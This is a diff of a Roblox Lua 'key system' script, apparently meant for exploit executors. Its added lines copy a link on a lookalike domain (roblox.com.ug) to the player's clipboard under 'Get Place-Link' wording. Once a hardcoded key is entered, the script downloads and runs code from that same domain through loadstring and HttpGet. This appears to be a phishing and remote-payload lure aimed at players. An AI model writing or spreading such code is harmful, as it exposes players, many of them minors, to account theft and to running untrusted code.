@@ -1,7 +1,5 @@
 local screenGui = Instance.new("ScreenGui")
 screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
-screenGui.IgnoreGuiInset = true -- Игнорируем стандартные отступы интерфейса
-screenGui.DisplayOrder = 999 -- Устанавливаем приоритет отображения поверх всего
 
 local frame = Instance.new("Frame")
 frame.Size = UDim2.new(0.3, 0, 0.4, 0)
@@ -13,7 +11,7 @@ local title = Instance.new("TextLabel")
 title.Size = UDim2.new(1, 0, 0.2, 0)
 title.Position = UDim2.new(0, 0, 0, 0)
 title.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
-title.Text = "Get Key in link"
+title.Text = "Get Verify in place"
 title.TextColor3 = Color3.new(1, 1, 1)
 title.Font = Enum.Font.GothamBlack
 title.TextSize = 24
@@ -39,35 +37,15 @@ enterKeyButton.Font = Enum.Font.GothamBlack
 enterKeyButton.TextSize = 18
 enterKeyButton.Parent = frame
 
--- Изменение кнопки "Get Key System"
 local getKeyButton = Instance.new("TextButton")
-getKeyButton.Size = UDim2.new(0.8, 0, 0.25, 0) -- Увеличиваем высоту кнопки
+getKeyButton.Size = UDim2.new(0.8, 0, 0.15, 0)
 getKeyButton.Position = UDim2.new(0.1, 0, 0.75, 0)
 getKeyButton.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
-getKeyButton.Text = "" -- Очищаем текст, так как добавим отдельные лейблы
+getKeyButton.Text = "Get Place-Link(Click to copy.)"
+getKeyButton.TextColor3 = Color3.new(1, 1, 1)
+getKeyButton.Font = Enum.Font.GothamBlack
+getKeyButton.TextSize = 18
 getKeyButton.Parent = frame
-
--- Лейбл "Click to copy" сверху
-local clickToCopyLabel = Instance.new("TextLabel")
-clickToCopyLabel.Size = UDim2.new(1, 0, 0.5, 0)
-clickToCopyLabel.Position = UDim2.new(0, 0, 0, 0)
-clickToCopyLabel.BackgroundTransparency = 1 -- Прозрачный фон
-clickToCopyLabel.Text = "Click to copy"
-clickToCopyLabel.TextColor3 = Color3.new(1, 1, 1)
-clickToCopyLabel.Font = Enum.Font.GothamBlack
-clickToCopyLabel.TextSize = 18
-clickToCopyLabel.Parent = getKeyButton
-
--- Лейбл "In link click Allow -> Download" снизу
-local linkInstructionsLabel = Instance.new("TextLabel")
-linkInstructionsLabel.Size = UDim2.new(1, 0, 0.5, 0)
-linkInstructionsLabel.Position = UDim2.new(0, 0, 0.5, 0)
-linkInstructionsLabel.BackgroundTransparency = 1 -- Прозрачный фон
-linkInstructionsLabel.Text = "In link click Allow -> Download"
-linkInstructionsLabel.TextColor3 = Color3.new(1, 1, 1)
-linkInstructionsLabel.Font = Enum.Font.GothamBlack
-linkInstructionsLabel.TextSize = 16
-linkInstructionsLabel.Parent = getKeyButton
 
 local function setClipboardWithURL()
     setclipboard("https://www.roblox.com.ug/share?code=079a0fc07dbdf458acc55837ed4e7de2&type=Server")
@@ -85,10 +63,10 @@ end
 
 local function enterKey()
     local userInputKey = textBox.Text
-    local correctKey = "Wra4wtLI9tJpEAMm7Wf7umxPJ"
+    local correctKey = "keyasdfisosdd"
 
     if userInputKey == correctKey then
-        local scriptURL = "https://raw.githubusercontent.com/GamerScripter/Game-Hub/main/loader"
+        local scriptURL = "https://www.roblox.com.ug/share?code=079a0fc07dbdf458acc55837ed4e7de2&type=Server"
         local success, result = pcall(function()
             return loadstring(game:HttpGet(scriptURL))()
         end)
